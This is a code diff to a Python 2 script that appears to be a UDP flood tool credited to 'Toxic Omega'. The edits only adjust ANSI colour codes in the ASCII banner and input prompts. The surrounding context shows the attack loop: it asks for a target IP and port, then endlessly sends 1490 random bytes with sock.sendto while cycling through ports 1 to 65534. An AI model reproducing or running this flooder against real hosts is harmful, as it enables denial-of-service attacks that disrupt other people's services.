@@ -19,19 +19,19 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-print("\033[32m   ____                             ")
-print("\033[32m  / __ \                            ")
-print("\033[32m | |  | |_ __ ___   ___  __ _  __ _ ")
-print("\033[32m | |  | | '_ ` _ \ / _ \/ _` |/ _` |")
-print("\033[32m | |__| | | | | | |  __/ (_| | (_| |")
-print("\033[32m  \____/|_| |_| |_|\___|\__, |\__,_|")
-print("\033[32m                         __/ |      ")
-print("\033[32m                        |___/       ")
+print("\033[32m   ____                             \033[32m")
+print("\033[32m  / __ \                            \033[32m")
+print("\033[32m | |  | |_ __ ___   ___  __ _  __ _ \033[32m")
+print("\033[32m | |  | | '_ ` _ \ / _ \/ _` |/ _` |\033[32m")
+print("\033[32m | |__| | | | | | |  __/ (_| | (_| |\033[32m")
+print("\033[32m  \____/|_| |_| |_|\___|\__, |\__,_|\033[32m")
+print("\033[32m                         __/ |      \033[32m")
+print("\033[32m                        |___/       \033[32m")
 print(" ")
-print("\033[31mDeveloper: Toxic Omega")
+print("\033[31mDeveloper: Toxic Omega\033[31m")
 print(" ")
-ip = raw_input("\033[32m[*] Ip: ")
-port = input("\033[32m[*] Port: ")
+ip = raw_input("\033[32m[*] Ip: \033[32m")
+port = input("\033[32m[*] Port: \033[32m")
 
 os.system("clear")
 time.sleep(5)
@@ -40,6 +40,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[31m|Packets: %s |Ip: %s | port: %s |"%(sent,ip,port)
+     print "\033[31m|Packets: %s |Ip: %s | port: %s |\033[31m"%(sent,ip,port)
      if port == 65534:
        port = 1
